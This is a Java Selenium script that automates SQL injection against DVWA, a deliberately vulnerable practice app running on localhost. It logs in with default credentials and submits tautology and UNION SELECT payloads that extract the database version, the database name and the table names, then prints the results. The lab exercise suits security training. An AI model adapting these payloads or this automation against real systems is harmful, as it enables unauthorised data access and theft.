package main.java;


import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.support.ui.Select;
import org.openqa.selenium.chrome.ChromeDriverService;
import org.openqa.selenium.htmlunit.HtmlUnitDriver;
import org.openqa.selenium.remote.service.DriverService;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;

public class AutomateSQLi {
 
	public static void main (String[] args) {

	WebDriver driver = new HtmlUnitDriver();
	
    System.setProperty("webdriver.chrome.driver", "C:\\Selenium Environment\\chromeDriverNew\\chromeDriver.exe");
    System.setProperty(ChromeDriverService.CHROME_DRIVER_SILENT_OUTPUT_PROPERTY,"true");
    
    Logger logger = Logger.getLogger("");
    logger.setLevel(Level.OFF); 
    driver.get("http://localhost/dvwa/vulnerabilities/sqli/");
    driver.findElement(By.className("loginInput")).sendKeys("admin");
    driver.findElement(By.name("password")).sendKeys("password");
    driver.findElement(By.name("Login")).click();
    
    driver.get("http://localhost/dvwa/vulnerabilities/sqli/");
    String[] defaulti = {"1' #","%' or '0'='0","%' or 0=0 union select null, version() #","%' or 0=0 union select null, database() #","%' and 1=0 union select null, table_name from information_schema.tables #"};
    for (int i = 0; i < defaulti.length; i++) {
    driver.findElement(By.name("id")).sendKeys(defaulti[i]);
    driver.findElement(By.name("Submit")).click();
    driver.findElement(By.xpath("//html/body/div/div[3]/div/div/pre"));
    System.out.println("");
    
    try {
		Thread.sleep(10*100);
	} catch (InterruptedException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
    
    System.out.println("Query: " +defaulti[i]);
    System.out.println("Output:  "+driver.findElement(By.xpath("//html/body/div/div[3]/div/div/pre")).getText());
    }
   }
 }
     
